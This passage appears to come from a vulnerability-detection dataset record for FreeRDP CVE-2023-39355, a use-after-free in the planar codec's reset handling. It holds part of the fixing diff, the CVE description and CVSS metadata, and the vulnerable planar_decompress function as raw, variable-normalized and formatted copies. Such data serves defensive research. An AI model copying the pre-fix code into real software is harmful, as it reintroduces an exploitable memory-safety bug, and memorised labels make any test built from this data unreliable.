-	tmp = winpr_aligned_recalloc(context->rlePlanesBuffer, context->maxPlaneSize, 4, 32);
-	if (!tmp)
-		return FALSE;
-	context->rlePlanesBuffer = tmp;
+		tmp = winpr_aligned_recalloc(context->deltaPlanesBuffer, context->maxPlaneSize, 4, 32);
+		if (!tmp)
+			return FALSE;
+		context->deltaPlanesBuffer = tmp;
 
-	context->planes[0] = &context->planesBuffer[context->maxPlaneSize * 0];
-	context->planes[1] = &context->planesBuffer[context->maxPlaneSize * 1];
-	context->planes[2] = &context->planesBuffer[context->maxPlaneSize * 2];
-	context->planes[3] = &context->planesBuffer[context->maxPlaneSize * 3];
-	context->deltaPlanes[0] = &context->deltaPlanesBuffer[context->maxPlaneSize * 0];
-	context->deltaPlanes[1] = &context->deltaPlanesBuffer[context->maxPlaneSize * 1];
-	context->deltaPlanes[2] = &context->deltaPlanesBuffer[context->maxPlaneSize * 2];
-	context->deltaPlanes[3] = &context->deltaPlanesBuffer[context->maxPlaneSize * 3];
+		tmp = winpr_aligned_recalloc(context->rlePlanesBuffer, context->maxPlaneSize, 4, 32);
+		if (!tmp)
+			return FALSE;
+		context->rlePlanesBuffer = tmp;
+
+		context->planes[0] = &context->planesBuffer[context->maxPlaneSize * 0];
+		context->planes[1] = &context->planesBuffer[context->maxPlaneSize * 1];
+		context->planes[2] = &context->planesBuffer[context->maxPlaneSize * 2];
+		context->planes[3] = &context->planesBuffer[context->maxPlaneSize * 3];
+		context->deltaPlanes[0] = &context->deltaPlanesBuffer[context->maxPlaneSize * 0];
+		context->deltaPlanes[1] = &context->deltaPlanesBuffer[context->maxPlaneSize * 1];
+		context->deltaPlanes[2] = &context->deltaPlanesBuffer[context->maxPlaneSize * 2];
+		context->deltaPlanes[3] = &context->deltaPlanesBuffer[context->maxPlaneSize * 3];
+	}
 	return TRUE;
 }","{'deleted_lines': ['\tvoid* tmp = winpr_aligned_recalloc(context->planesBuffer, context->maxPlaneSize, 4, 32);', '\tif (!tmp)', '\t\treturn FALSE;', '\tcontext->planesBuffer = tmp;', '\ttmp = winpr_aligned_recalloc(context->pTempData, context->maxPlaneSize, 6, 32);', '\tif (!tmp)', '\t\treturn FALSE;', '\tcontext->pTempData = tmp;', '\ttmp = winpr_aligned_recalloc(context->deltaPlanesBuffer, context->maxPlaneSize, 4, 32);', '\tif (!tmp)', '\t\treturn FALSE;', '\tcontext->deltaPlanesBuffer = tmp;', '\ttmp = winpr_aligned_recalloc(context->rlePlanesBuffer, context->maxPlaneSize, 4, 32);', '\tif (!tmp)', '\t\treturn FALSE;', '\tcontext->rlePlanesBuffer = tmp;', '\tcontext->planes[0] = &context->planesBuffer[context->maxPlaneSize * 0];', '\tcontext->planes[1] = &context->planesBuffer[context->maxPlaneSize * 1];', '\tcontext->planes[2] = &context->planesBuffer[context->maxPlaneSize * 2];', '\tcontext->planes[3] = &context->planesBuffer[context->maxPlaneSize * 3];', '\tcontext->deltaPlanes[0] = &context->deltaPlanesBuffer[context->maxPlaneSize * 0];', '\tcontext->deltaPlanes[1] = &context->deltaPlanesBuffer[context->maxPlaneSize * 1];', '\tcontext->deltaPlanes[2] = &context->deltaPlanesBuffer[context->maxPlaneSize * 2];', '\tcontext->deltaPlanes[3] = &context->deltaPlanesBuffer[context->maxPlaneSize * 3];'], 'added_lines': ['\tmemset(context->planes, 0, sizeof(context->planes));', '\tmemset(context->rlePlanes, 0, sizeof(context->rlePlanes));', '\tmemset(context->deltaPlanes, 0, sizeof(context->deltaPlanes));', '\tif (context->maxPlaneSize > 0)', '\t{', '\t\tvoid* tmp = winpr_aligned_recalloc(context->planesBuffer, context->maxPlaneSize, 4, 32);', '\t\tif (!tmp)', '\t\t\treturn FALSE;', '\t\tcontext->planesBuffer = tmp;', '\t\ttmp = winpr_aligned_recalloc(context->pTempData, context->maxPlaneSize, 6, 32);', '\t\tif (!tmp)', '\t\t\treturn FALSE;', '\t\tcontext->pTempData = tmp;', '\t\ttmp = winpr_aligned_recalloc(context->deltaPlanesBuffer, context->maxPlaneSize, 4, 32);', '\t\tif (!tmp)', '\t\t\treturn FALSE;', '\t\tcontext->deltaPlanesBuffer = tmp;', '\t\ttmp = winpr_aligned_recalloc(context->rlePlanesBuffer, context->maxPlaneSize, 4, 32);', '\t\tif (!tmp)', '\t\t\treturn FALSE;', '\t\tcontext->rlePlanesBuffer = tmp;', '', '\t\tcontext->planes[0] = &context->planesBuffer[context->maxPlaneSize * 0];', '\t\tcontext->planes[1] = &context->planesBuffer[context->maxPlaneSize * 1];', '\t\tcontext->planes[2] = &context->planesBuffer[context->maxPlaneSize * 2];', '\t\tcontext->planes[3] = &context->planesBuffer[context->maxPlaneSize * 3];', '\t\tcontext->deltaPlanes[0] = &context->deltaPlanesBuffer[context->maxPlaneSize * 0];', '\t\tcontext->deltaPlanes[1] = &context->deltaPlanesBuffer[context->maxPlaneSize * 1];', '\t\tcontext->deltaPlanes[2] = &context->deltaPlanesBuffer[context->maxPlaneSize * 2];', '\t\tcontext->deltaPlanes[3] = &context->deltaPlanesBuffer[context->maxPlaneSize * 3];', '\t}']}",True,"FreeRDP is a free implementation of the Remote Desktop Protocol (RDP), released under the Apache license. Versions of FreeRDP on the 3.x release branch before beta3 are subject to a Use-After-Free in processing `RDPGFX_CMDID_RESETGRAPHICS` packets. If `context->maxPlaneSize` is 0, `context->planesBuffer` will be freed. However, without updating `context->planesBuffer`, this leads to a Use-After-Free exploit vector. In most environments this should only result in a crash. This issue has been addressed in version 3.0.0-beta3 and users of the beta 3.x releases are advised to upgrade. There are no known workarounds for this vulnerability.",7.0,HIGH,2,valid,2023-08-05T08:15:41Z,4
CVE-2023-39355,['CWE-416'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H,1,FreeRDP,"[codec,planar] fix reset",d6f9d33a7db0b346195b6a15b5b99944ba41beee,https://github.com/FreeRDP/FreeRDP/commit/d6f9d33a7db0b346195b6a15b5b99944ba41beee,libfreerdp/codec/planar.c,planar_decompress,"BOOL planar_decompress(BITMAP_PLANAR_CONTEXT* planar, const BYTE* pSrcData, UINT32 SrcSize,
UINT32 nSrcWidth, UINT32 nSrcHeight, BYTE* pDstData, UINT32 DstFormat,
UINT32 nDstStep, UINT32 nXDst, UINT32 nYDst, UINT32 nDstWidth,
UINT32 nDstHeight, BOOL vFlip)
{
BOOL cs;
BOOL rle;
UINT32 cll;
BOOL alpha;
BOOL useAlpha = FALSE;
INT32 status;
const BYTE* srcp;
UINT32 subSize;
UINT32 subWidth;
UINT32 subHeight;
UINT32 planeSize;
INT32 rleSizes[4] = { 0, 0, 0, 0 };
UINT32 rawSizes[4];
UINT32 rawWidths[4];
UINT32 rawHeights[4];
BYTE FormatHeader;
const BYTE* planes[4] = { 0 };
const UINT32 w = MIN(nSrcWidth, nDstWidth);
const UINT32 h = MIN(nSrcHeight, nDstHeight);
const primitives_t* prims = primitives_get();
WINPR_ASSERT(planar);
WINPR_ASSERT(prims);
if (nDstStep <= 0)
nDstStep = nDstWidth * FreeRDPGetBytesPerPixel(DstFormat);
srcp = pSrcData;
if (!pSrcData)
{
WLog_ERR(TAG, ""Invalid argument pSrcData=NULL"");
return FALSE;
}
if (!pDstData)
{
WLog_ERR(TAG, ""Invalid argument pDstData=NULL"");
return FALSE;
}
FormatHeader = *srcp++;
cll = (FormatHeader & PLANAR_FORMAT_HEADER_CLL_MASK);
cs = (FormatHeader & PLANAR_FORMAT_HEADER_CS) ? TRUE : FALSE;
rle = (FormatHeader & PLANAR_FORMAT_HEADER_RLE) ? TRUE : FALSE;
alpha = (FormatHeader & PLANAR_FORMAT_HEADER_NA) ? FALSE : TRUE;
DstFormat = planar_invert_format(planar, alpha, DstFormat);
if (alpha)
useAlpha = FreeRDPColorHasAlpha(DstFormat);
if (!cll && cs)
{
WLog_ERR(TAG, ""Chroma subsampling requires YCoCg and does not work with RGB data"");
return FALSE; 
}
subWidth = (nSrcWidth / 2) + (nSrcWidth % 2);
subHeight = (nSrcHeight / 2) + (nSrcHeight % 2);
planeSize = nSrcWidth * nSrcHeight;
subSize = subWidth * subHeight;
if (!cs)
{
rawSizes[0] = planeSize; 
rawWidths[0] = nSrcWidth;
rawHeights[0] = nSrcHeight;
rawSizes[1] = planeSize; 
rawWidths[1] = nSrcWidth;
rawHeights[1] = nSrcHeight;
rawSizes[2] = planeSize; 
rawWidths[2] = nSrcWidth;
rawHeights[2] = nSrcHeight;
rawSizes[3] = planeSize; 
rawWidths[3] = nSrcWidth;
rawHeights[3] = nSrcHeight;
}
else 
{
rawSizes[0] = planeSize; 
rawWidths[0] = nSrcWidth;
rawHeights[0] = nSrcHeight;
rawSizes[1] = subSize; 
rawWidths[1] = subWidth;
rawHeights[1] = subHeight;
rawSizes[2] = subSize; 
rawWidths[2] = subWidth;
rawHeights[2] = subHeight;
rawSizes[3] = planeSize; 
rawWidths[3] = nSrcWidth;
rawHeights[3] = nSrcHeight;
}
if (!rle) 
{
UINT32 base = planeSize * 3;
if (cs)
base = planeSize + planeSize / 2;
if (alpha)
{
if ((SrcSize - (srcp - pSrcData)) < (planeSize + base))
{
WLog_ERR(TAG, ""Alpha plane size mismatch %"" PRIu32 "" < %"" PRIu32,
SrcSize - (srcp - pSrcData), (planeSize + base));
return FALSE;
}
planes[3] = srcp;                    
planes[0] = planes[3] + rawSizes[3]; 
planes[1] = planes[0] + rawSizes[0]; 
planes[2] = planes[1] + rawSizes[1]; 
if ((planes[2] + rawSizes[2]) > &pSrcData[SrcSize])
{
WLog_ERR(TAG, ""plane size mismatch %p + %"" PRIu32 "" > %p"", planes[2], rawSizes[2],
&pSrcData[SrcSize]);
return FALSE;
}
}
else
{
if ((SrcSize - (srcp - pSrcData)) < base)
{
WLog_ERR(TAG, ""plane size mismatch %"" PRIu32 "" < %"" PRIu32,
SrcSize - (srcp - pSrcData), base);
return FALSE;
}
planes[0] = srcp;                    
planes[1] = planes[0] + rawSizes[0]; 
planes[2] = planes[1] + rawSizes[1]; 
if ((planes[2] + rawSizes[2]) > &pSrcData[SrcSize])
{
WLog_ERR(TAG, ""plane size mismatch %p + %"" PRIu32 "" > %p"", planes[2], rawSizes[2],
&pSrcData[SrcSize]);
return FALSE;
}
}
}
else 
{
if (alpha)
{
planes[3] = srcp;
rleSizes[3] = planar_skip_plane_rle(planes[3], SrcSize - (planes[3] - pSrcData),
rawWidths[3], rawHeights[3]); 
if (rleSizes[3] < 0)
return FALSE;
planes[0] = planes[3] + rleSizes[3];
}
else
planes[0] = srcp;
rleSizes[0] = planar_skip_plane_rle(planes[0], SrcSize - (planes[0] - pSrcData),
rawWidths[0], rawHeights[0]); 
if (rleSizes[0] < 0)
return FALSE;
planes[1] = planes[0] + rleSizes[0];
rleSizes[1] = planar_skip_plane_rle(planes[1], SrcSize - (planes[1] - pSrcData),
rawWidths[1], rawHeights[1]); 
if (rleSizes[1] < 1)
return FALSE;
planes[2] = planes[1] + rleSizes[1];
rleSizes[2] = planar_skip_plane_rle(planes[2], SrcSize - (planes[2] - pSrcData),
rawWidths[2], rawHeights[2]); 
if (rleSizes[2] < 1)
return FALSE;
}
if (!cll) 
{
UINT32 TempFormat;
BYTE* pTempData = pDstData;
UINT32 nTempStep = nDstStep;
UINT32 nTotalHeight = nYDst + nDstHeight;
if (useAlpha)
TempFormat = PIXEL_FORMAT_BGRA32;
else
TempFormat = PIXEL_FORMAT_BGRX32;
TempFormat = planar_invert_format(planar, alpha, TempFormat);
if ((TempFormat != DstFormat) || (nSrcWidth != nDstWidth) || (nSrcHeight != nDstHeight))
{
pTempData = planar->pTempData;
nTempStep = planar->nTempStep;
nTotalHeight = planar->maxHeight;
}
if (!rle) 
{
if (!planar_decompress_planes_raw(planes, pTempData, TempFormat, nTempStep, nXDst,
nYDst, nSrcWidth, nSrcHeight, vFlip, nTotalHeight))
return FALSE;
if (alpha)
srcp += rawSizes[0] + rawSizes[1] + rawSizes[2] + rawSizes[3];
else 
srcp += rawSizes[0] + rawSizes[1] + rawSizes[2];
if ((SrcSize - (srcp - pSrcData)) == 1)
srcp++; 
}
else 
{
status =
planar_decompress_plane_rle(planes[0], rleSizes[0], pTempData, nTempStep, nXDst,
nYDst, nSrcWidth, nSrcHeight, 2, vFlip); 
if (status < 0)
return FALSE;
status = planar_decompress_plane_rle(planes[1], rleSizes[1], pTempData, nTempStep,
nXDst, nYDst, nSrcWidth, nSrcHeight, 1,
vFlip); 
if (status < 0)
return FALSE;
status =
planar_decompress_plane_rle(planes[2], rleSizes[2], pTempData, nTempStep, nXDst,
nYDst, nSrcWidth, nSrcHeight, 0, vFlip); 
if (status < 0)
return FALSE;
srcp += rleSizes[0] + rleSizes[1] + rleSizes[2];
if (useAlpha)
{
status = planar_decompress_plane_rle(planes[3], rleSizes[3], pTempData, nTempStep,
nXDst, nYDst, nSrcWidth, nSrcHeight, 3,
vFlip); 
}
else
status = planar_set_plane(0xFF, pTempData, nTempStep, nXDst, nYDst, nSrcWidth,
nSrcHeight, 3, vFlip);
if (status < 0)
return FALSE;
if (alpha)
srcp += rleSizes[3];
}
if (pTempData != pDstData)
{
if (!freerdp_image_copy(pDstData, DstFormat, nDstStep, nXDst, nYDst, w, h, pTempData,
TempFormat, nTempStep, nXDst, nYDst, NULL, FREERDP_FLIP_NONE))
{
WLog_ERR(TAG, ""planar image copy failed"");
return FALSE;
}
}
}
else 
{
UINT32 TempFormat;
BYTE* pTempData = planar->pTempData;
UINT32 nTempStep = planar->nTempStep;
UINT32 nTotalHeight = planar->maxHeight;
BYTE* dst = &pDstData[nXDst * FreeRDPGetBytesPerPixel(DstFormat) + nYDst * nDstStep];
if (useAlpha)
TempFormat = PIXEL_FORMAT_BGRA32;
else
TempFormat = PIXEL_FORMAT_BGRX32;
if (!pTempData)
{
return FALSE;
}
if (rle) 
{
BYTE* rleBuffer[4] = { 0 };
rleBuffer[3] = planar->rlePlanesBuffer;  
rleBuffer[0] = rleBuffer[3] + planeSize; 
rleBuffer[1] = rleBuffer[0] + planeSize; 
rleBuffer[2] = rleBuffer[1] + planeSize; 
if (useAlpha)
{
status =
planar_decompress_plane_rle_only(planes[3], rleSizes[3], rleBuffer[3],
rawWidths[3], rawHeights[3]); 
if (status < 0)
return FALSE;
}
if (alpha)
srcp += rleSizes[3];
status = planar_decompress_plane_rle_only(planes[0], rleSizes[0], rleBuffer[0],
rawWidths[0], rawHeights[0]); 
if (status < 0)
return FALSE;
status =
planar_decompress_plane_rle_only(planes[1], rleSizes[1], rleBuffer[1], rawWidths[1],
rawHeights[1]); 
if (status < 0)
return FALSE;
status =
planar_decompress_plane_rle_only(planes[2], rleSizes[2], rleBuffer[2], rawWidths[2],
rawHeights[2]); 
if (status < 0)
return FALSE;
planes[0] = rleBuffer[0];
planes[1] = rleBuffer[1];
planes[2] = rleBuffer[2];
planes[3] = rleBuffer[3];
}
{
if (cs)
{ 
if (!planar_subsample_expand(planes[1], rawSizes[1], nSrcWidth, nSrcHeight,
rawWidths[1], rawHeights[1], planar->deltaPlanes[0]))
return FALSE;
planes[1] = planar->deltaPlanes[0];
rawSizes[1] = planeSize; 
rawWidths[1] = nSrcWidth;
rawHeights[1] = nSrcHeight;
if (!planar_subsample_expand(planes[2], rawSizes[2], nSrcWidth, nSrcHeight,
rawWidths[2], rawHeights[2], planar->deltaPlanes[1]))
return FALSE;
planes[2] = planar->deltaPlanes[1];
rawSizes[2] = planeSize; 
rawWidths[2] = nSrcWidth;
rawHeights[2] = nSrcHeight;
}
if (!planar_decompress_planes_raw(planes, pTempData, TempFormat, nTempStep, nXDst,
nYDst, nSrcWidth, nSrcHeight, vFlip, nTotalHeight))
return FALSE;
if (alpha)
srcp += rawSizes[0] + rawSizes[1] + rawSizes[2] + rawSizes[3];
else 
srcp += rawSizes[0] + rawSizes[1] + rawSizes[2];
if ((SrcSize - (srcp - pSrcData)) == 1)
srcp++; 
}
WINPR_ASSERT(prims->YCoCgToRGB_8u_AC4R);
int rc = prims->YCoCgToRGB_8u_AC4R(pTempData, nTempStep, dst, DstFormat, nDstStep, w, h,
cll, useAlpha);
if (rc != PRIMITIVES_SUCCESS)
{
WLog_ERR(TAG, ""YCoCgToRGB_8u_AC4R failed with %d"", rc);
return FALSE;
}
}
WINPR_UNUSED(srcp);
return TRUE;
}","BOOL planar_decompress(BITMAP_PLANAR_CONTEXT* VAR_0, const BYTE* VAR_1, UINT32 VAR_2,
UINT32 VAR_3, UINT32 VAR_4, BYTE* VAR_5, UINT32 VAR_6,
UINT32 VAR_7, UINT32 VAR_8, UINT32 VAR_9, UINT32 VAR_10,
UINT32 VAR_11, BOOL VAR_12)
{
BOOL VAR_13;
BOOL VAR_14;
UINT32 VAR_15;
BOOL VAR_16;
BOOL VAR_17 = FALSE;
INT32 VAR_18;
const BYTE* VAR_19;
UINT32 VAR_20;
UINT32 VAR_21;
UINT32 VAR_22;
UINT32 VAR_23;
INT32 VAR_24[4] = { 0, 0, 0, 0 };
UINT32 VAR_25[4];
UINT32 VAR_26[4];
UINT32 VAR_27[4];
BYTE VAR_28;
const BYTE* VAR_29[4] = { 0 };
const UINT32 VAR_30 = MIN(VAR_3, VAR_10);
const UINT32 VAR_31 = MIN(VAR_4, VAR_11);
const primitives_t* VAR_32 = primitives_get();
WINPR_ASSERT(VAR_0);
WINPR_ASSERT(VAR_32);
if (VAR_7 <= 0)
VAR_7 = VAR_10 * FreeRDPGetBytesPerPixel(VAR_6);
VAR_19 = VAR_1;
if (!VAR_1)
{
WLog_ERR(VAR_33, ""Invalid argument pSrcData=NULL"");
return FALSE;
}
if (!VAR_5)
{
WLog_ERR(VAR_33, ""Invalid argument pDstData=NULL"");
return FALSE;
}
VAR_28 = *VAR_19++;
VAR_15 = (VAR_28 & VAR_34);
VAR_13 = (VAR_28 & VAR_35) ? TRUE : FALSE;
VAR_14 = (VAR_28 & VAR_36) ? TRUE : FALSE;
VAR_16 = (VAR_28 & VAR_37) ? FALSE : TRUE;
VAR_6 = planar_invert_format(VAR_0, VAR_16, VAR_6);
if (VAR_16)
VAR_17 = FreeRDPColorHasAlpha(VAR_6);
if (!VAR_15 && VAR_13)
{
WLog_ERR(VAR_33, ""Chroma subsampling requires YCoCg and does not work with RGB data"");
return FALSE; 
}
VAR_21 = (VAR_3 / 2) + (VAR_3 % 2);
VAR_22 = (VAR_4 / 2) + (VAR_4 % 2);
VAR_23 = VAR_3 * VAR_4;
VAR_20 = VAR_21 * VAR_22;
if (!VAR_13)
{
VAR_25[0] = VAR_23; 
VAR_26[0] = VAR_3;
VAR_27[0] = VAR_4;
VAR_25[1] = VAR_23; 
VAR_26[1] = VAR_3;
VAR_27[1] = VAR_4;
VAR_25[2] = VAR_23; 
VAR_26[2] = VAR_3;
VAR_27[2] = VAR_4;
VAR_25[3] = VAR_23; 
VAR_26[3] = VAR_3;
VAR_27[3] = VAR_4;
}
else 
{
VAR_25[0] = VAR_23; 
VAR_26[0] = VAR_3;
VAR_27[0] = VAR_4;
VAR_25[1] = VAR_20; 
VAR_26[1] = VAR_21;
VAR_27[1] = VAR_22;
VAR_25[2] = VAR_20; 
VAR_26[2] = VAR_21;
VAR_27[2] = VAR_22;
VAR_25[3] = VAR_23; 
VAR_26[3] = VAR_3;
VAR_27[3] = VAR_4;
}
if (!VAR_14) 
{
UINT32 VAR_38 = VAR_23 * 3;
if (VAR_13)
VAR_38 = VAR_23 + VAR_23 / 2;
if (VAR_16)
{
if ((VAR_2 - (VAR_19 - VAR_1)) < (VAR_23 + VAR_38))
{
WLog_ERR(VAR_33, ""Alpha plane size mismatch %"" VAR_39 "" < %"" VAR_39,
VAR_2 - (VAR_19 - VAR_1), (VAR_23 + VAR_38));
return FALSE;
}
VAR_29[3] = VAR_19;                    
VAR_29[0] = VAR_29[3] + VAR_25[3]; 
VAR_29[1] = VAR_29[0] + VAR_25[0]; 
VAR_29[2] = VAR_29[1] + VAR_25[1]; 
if ((VAR_29[2] + VAR_25[2]) > &VAR_1[VAR_2])
{
WLog_ERR(VAR_33, ""plane size mismatch %p + %"" VAR_39 "" > %p"", VAR_29[2], VAR_25[2],
&VAR_1[VAR_2]);
return FALSE;
}
}
else
{
if ((VAR_2 - (VAR_19 - VAR_1)) < VAR_38)
{
WLog_ERR(VAR_33, ""plane size mismatch %"" VAR_39 "" < %"" VAR_39,
VAR_2 - (VAR_19 - VAR_1), VAR_38);
return FALSE;
}
VAR_29[0] = VAR_19;                    
VAR_29[1] = VAR_29[0] + VAR_25[0]; 
VAR_29[2] = VAR_29[1] + VAR_25[1]; 
if ((VAR_29[2] + VAR_25[2]) > &VAR_1[VAR_2])
{
WLog_ERR(VAR_33, ""plane size mismatch %p + %"" VAR_39 "" > %p"", VAR_29[2], VAR_25[2],
&VAR_1[VAR_2]);
return FALSE;
}
}
}
else 
{
if (VAR_16)
{
VAR_29[3] = VAR_19;
VAR_24[3] = planar_skip_plane_rle(VAR_29[3], VAR_2 - (VAR_29[3] - VAR_1),
VAR_26[3], VAR_27[3]); 
if (VAR_24[3] < 0)
return FALSE;
VAR_29[0] = VAR_29[3] + VAR_24[3];
}
else
VAR_29[0] = VAR_19;
VAR_24[0] = planar_skip_plane_rle(VAR_29[0], VAR_2 - (VAR_29[0] - VAR_1),
VAR_26[0], VAR_27[0]); 
if (VAR_24[0] < 0)
return FALSE;
VAR_29[1] = VAR_29[0] + VAR_24[0];
VAR_24[1] = planar_skip_plane_rle(VAR_29[1], VAR_2 - (VAR_29[1] - VAR_1),
VAR_26[1], VAR_27[1]); 
if (VAR_24[1] < 1)
return FALSE;
VAR_29[2] = VAR_29[1] + VAR_24[1];
VAR_24[2] = planar_skip_plane_rle(VAR_29[2], VAR_2 - (VAR_29[2] - VAR_1),
VAR_26[2], VAR_27[2]); 
if (VAR_24[2] < 1)
return FALSE;
}
if (!VAR_15) 
{
UINT32 VAR_40;
BYTE* VAR_41 = VAR_5;
UINT32 VAR_42 = VAR_7;
UINT32 VAR_43 = VAR_9 + VAR_11;
if (VAR_17)
VAR_40 = VAR_44;
else
VAR_40 = VAR_45;
VAR_40 = planar_invert_format(VAR_0, VAR_16, VAR_40);
if ((VAR_40 != VAR_6) || (VAR_3 != VAR_10) || (VAR_4 != VAR_11))
{
VAR_41 = VAR_0->pTempData;
VAR_42 = VAR_0->nTempStep;
VAR_43 = VAR_0->maxHeight;
}
if (!VAR_14) 
{
if (!planar_decompress_planes_raw(VAR_29, VAR_41, VAR_40, VAR_42, VAR_8,
VAR_9, VAR_3, VAR_4, VAR_12, VAR_43))
return FALSE;
if (VAR_16)
VAR_19 += VAR_25[0] + VAR_25[1] + VAR_25[2] + VAR_25[3];
else 
VAR_19 += VAR_25[0] + VAR_25[1] + VAR_25[2];
if ((VAR_2 - (VAR_19 - VAR_1)) == 1)
VAR_19++; 
}
else 
{
VAR_18 =
planar_decompress_plane_rle(VAR_29[0], VAR_24[0], VAR_41, VAR_42, VAR_8,
VAR_9, VAR_3, VAR_4, 2, VAR_12); 
if (VAR_18 < 0)
return FALSE;
VAR_18 = planar_decompress_plane_rle(VAR_29[1], VAR_24[1], VAR_41, VAR_42,
VAR_8, VAR_9, VAR_3, VAR_4, 1,
VAR_12); 
if (VAR_18 < 0)
return FALSE;
VAR_18 =
planar_decompress_plane_rle(VAR_29[2], VAR_24[2], VAR_41, VAR_42, VAR_8,
VAR_9, VAR_3, VAR_4, 0, VAR_12); 
if (VAR_18 < 0)
return FALSE;
VAR_19 += VAR_24[0] + VAR_24[1] + VAR_24[2];
if (VAR_17)
{
VAR_18 = planar_decompress_plane_rle(VAR_29[3], VAR_24[3], VAR_41, VAR_42,
VAR_8, VAR_9, VAR_3, VAR_4, 3,
VAR_12); 
}
else
VAR_18 = planar_set_plane(0xFF, VAR_41, VAR_42, VAR_8, VAR_9, VAR_3,
VAR_4, 3, VAR_12);
if (VAR_18 < 0)
return FALSE;
if (VAR_16)
VAR_19 += VAR_24[3];
}
if (VAR_41 != VAR_5)
{
if (!freerdp_image_copy(VAR_5, VAR_6, VAR_7, VAR_8, VAR_9, VAR_30, VAR_31, VAR_41,
VAR_40, VAR_42, VAR_8, VAR_9, NULL, VAR_46))
{
WLog_ERR(VAR_33, ""planar image copy failed"");
return FALSE;
}
}
}
else 
{
UINT32 VAR_40;
BYTE* VAR_41 = VAR_0->pTempData;
UINT32 VAR_42 = VAR_0->nTempStep;
UINT32 VAR_43 = VAR_0->maxHeight;
BYTE* VAR_47 = &VAR_5[VAR_8 * FreeRDPGetBytesPerPixel(VAR_6) + VAR_9 * VAR_7];
if (VAR_17)
VAR_40 = VAR_44;
else
VAR_40 = VAR_45;
if (!VAR_41)
{
return FALSE;
}
if (VAR_14) 
{
BYTE* VAR_48[4] = { 0 };
VAR_48[3] = VAR_0->rlePlanesBuffer;  
VAR_48[0] = VAR_48[3] + VAR_23; 
VAR_48[1] = VAR_48[0] + VAR_23; 
VAR_48[2] = VAR_48[1] + VAR_23; 
if (VAR_17)
{
VAR_18 =
planar_decompress_plane_rle_only(VAR_29[3], VAR_24[3], VAR_48[3],
VAR_26[3], VAR_27[3]); 
if (VAR_18 < 0)
return FALSE;
}
if (VAR_16)
VAR_19 += VAR_24[3];
VAR_18 = planar_decompress_plane_rle_only(VAR_29[0], VAR_24[0], VAR_48[0],
VAR_26[0], VAR_27[0]); 
if (VAR_18 < 0)
return FALSE;
VAR_18 =
planar_decompress_plane_rle_only(VAR_29[1], VAR_24[1], VAR_48[1], VAR_26[1],
VAR_27[1]); 
if (VAR_18 < 0)
return FALSE;
VAR_18 =
planar_decompress_plane_rle_only(VAR_29[2], VAR_24[2], VAR_48[2], VAR_26[2],
VAR_27[2]); 
if (VAR_18 < 0)
return FALSE;
VAR_29[0] = VAR_48[0];
VAR_29[1] = VAR_48[1];
VAR_29[2] = VAR_48[2];
VAR_29[3] = VAR_48[3];
}
{
if (VAR_13)
{ 
if (!planar_subsample_expand(VAR_29[1], VAR_25[1], VAR_3, VAR_4,
VAR_26[1], VAR_27[1], VAR_0->deltaPlanes[0]))
return FALSE;
VAR_29[1] = VAR_0->deltaPlanes[0];
VAR_25[1] = VAR_23; 
VAR_26[1] = VAR_3;
VAR_27[1] = VAR_4;
if (!planar_subsample_expand(VAR_29[2], VAR_25[2], VAR_3, VAR_4,
VAR_26[2], VAR_27[2], VAR_0->deltaPlanes[1]))
return FALSE;
VAR_29[2] = VAR_0->deltaPlanes[1];
VAR_25[2] = VAR_23; 
VAR_26[2] = VAR_3;
VAR_27[2] = VAR_4;
}
if (!planar_decompress_planes_raw(VAR_29, VAR_41, VAR_40, VAR_42, VAR_8,
VAR_9, VAR_3, VAR_4, VAR_12, VAR_43))
return FALSE;
if (VAR_16)
VAR_19 += VAR_25[0] + VAR_25[1] + VAR_25[2] + VAR_25[3];
else 
VAR_19 += VAR_25[0] + VAR_25[1] + VAR_25[2];
if ((VAR_2 - (VAR_19 - VAR_1)) == 1)
VAR_19++; 
}
WINPR_ASSERT(VAR_32->YCoCgToRGB_8u_AC4R);
int VAR_49 = VAR_32->YCoCgToRGB_8u_AC4R(VAR_41, VAR_42, VAR_47, VAR_6, VAR_7, VAR_30, VAR_31,
VAR_15, VAR_17);
if (VAR_49 != VAR_50)
{
WLog_ERR(VAR_33, ""YCoCgToRGB_8u_AC4R failed with %d"", VAR_49);
return FALSE;
}
}
WINPR_UNUSED(VAR_19);
return TRUE;
}",FreeRDP/d6f9d33a7db0b346195b6a15b5b99944ba41beee/planar.c/vul/before/0.json,"BOOL planar_decompress(BITMAP_PLANAR_CONTEXT* planar, const BYTE* pSrcData, UINT32 SrcSize,
                       UINT32 nSrcWidth, UINT32 nSrcHeight, BYTE* pDstData, UINT32 DstFormat,
                       UINT32 nDstStep, UINT32 nXDst, UINT32 nYDst, UINT32 nDstWidth,
                       UINT32 nDstHeight, BOOL vFlip)
{
	BOOL cs;
	BOOL rle;
	UINT32 cll;
	BOOL alpha;
	BOOL useAlpha = FALSE;
	INT32 status;
	const BYTE* srcp;
	UINT32 subSize;
	UINT32 subWidth;
	UINT32 subHeight;
	UINT32 planeSize;
	INT32 rleSizes[4] = { 0, 0, 0, 0 };
	UINT32 rawSizes[4];
	UINT32 rawWidths[4];
	UINT32 rawHeights[4];
	BYTE FormatHeader;
	const BYTE* planes[4] = { 0 };
	const UINT32 w = MIN(nSrcWidth, nDstWidth);
	const UINT32 h = MIN(nSrcHeight, nDstHeight);
	const primitives_t* prims = primitives_get();

	WINPR_ASSERT(planar);
	WINPR_ASSERT(prims);

	if (nDstStep <= 0)
		nDstStep = nDstWidth * FreeRDPGetBytesPerPixel(DstFormat);

	srcp = pSrcData;

	if (!pSrcData)
	{
		WLog_ERR(TAG, ""Invalid argument pSrcData=NULL"");
		return FALSE;
	}

	if (!pDstData)
	{
		WLog_ERR(TAG, ""Invalid argument pDstData=NULL"");
		return FALSE;
	}

	FormatHeader = *srcp++;
	cll = (FormatHeader & PLANAR_FORMAT_HEADER_CLL_MASK);
	cs = (FormatHeader & PLANAR_FORMAT_HEADER_CS) ? TRUE : FALSE;
	rle = (FormatHeader & PLANAR_FORMAT_HEADER_RLE) ? TRUE : FALSE;
	alpha = (FormatHeader & PLANAR_FORMAT_HEADER_NA) ? FALSE : TRUE;

	DstFormat = planar_invert_format(planar, alpha, DstFormat);

	if (alpha)
		useAlpha = FreeRDPColorHasAlpha(DstFormat);

	// WLog_INFO(TAG, ""CLL: %""PRIu32"" CS: %""PRIu8"" RLE: %""PRIu8"" ALPHA: %""PRIu8"""", cll, cs, rle,
	// alpha);

	if (!cll && cs)
	{
		WLog_ERR(TAG, ""Chroma subsampling requires YCoCg and does not work with RGB data"");
		return FALSE; /* Chroma subsampling requires YCoCg */
	}

